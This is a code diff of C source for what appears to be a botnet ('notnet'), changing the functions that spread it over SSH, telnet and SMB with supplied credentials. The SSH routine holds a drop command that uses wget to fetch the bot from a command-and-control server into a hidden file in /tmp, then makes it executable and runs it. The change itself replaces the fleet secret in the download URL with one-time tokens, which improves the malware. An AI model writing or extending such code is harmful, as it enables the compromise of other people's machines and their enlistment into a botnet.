@@ -88,8 +88,8 @@ static const char *lotl_get_key(notnet_bot_t *bot) {
 static int lotl_spend_ssh(notnet_bot_t *bot, const char *ip, uint16_t port,
                            const char *user, const char *pass) {
     char dl_url[512];
-    snprintf(dl_url, sizeof(dl_url), "http://%.250s:%d/bot/notnet?secret=%s",
-             bot->c2_http.server, PAYLOAD_DL_PORT, bot->secret);
+    /* #190: one-time download token instead of the fleet secret. */
+    build_drop_url(bot, dl_url, sizeof(dl_url));
     char drop_cmd[1024];
     snprintf(drop_cmd, sizeof(drop_cmd),
              "wget %.500s -O /tmp/.notnet;chmod +x /tmp/.notnet;/tmp/.notnet",
@@ -131,8 +131,8 @@ static int lotl_spend_ssh(notnet_bot_t *bot, const char *ip, uint16_t port,
 static int lotl_spend_telnet(notnet_bot_t *bot, const char *ip, uint16_t port,
                               const char *user, const char *pass) {
     char dl_url[512];
-    snprintf(dl_url, sizeof(dl_url), "http://%.250s:%d/bot/notnet?secret=%s",
-             bot->c2_http.server, PAYLOAD_DL_PORT, bot->secret);
+    /* #190: one-time download token instead of the fleet secret. */
+    build_drop_url(bot, dl_url, sizeof(dl_url));
     log_info("LOTL: telnet spend %s@%s:%u (%.80s)", user, ip, (unsigned)port, dl_url);
     (void)pass;
     return 0;
@@ -141,8 +141,8 @@ static int lotl_spend_telnet(notnet_bot_t *bot, const char *ip, uint16_t port,
 static int lotl_spend_smb(notnet_bot_t *bot, const char *ip, uint16_t port,
                            const char *user, const char *pass) {
     char dl_url[512];
-    snprintf(dl_url, sizeof(dl_url), "http://%.250s:%d/bot/notnet?secret=%s",
-             bot->c2_http.server, PAYLOAD_DL_PORT, bot->secret);
+    /* #190: one-time download token instead of the fleet secret. */
+    build_drop_url(bot, dl_url, sizeof(dl_url));
     log_info("LOTL: smb spend %s@%s (smbclient put %s)", user, ip, dl_url);
     (void)port; (void)pass;
     return 0;
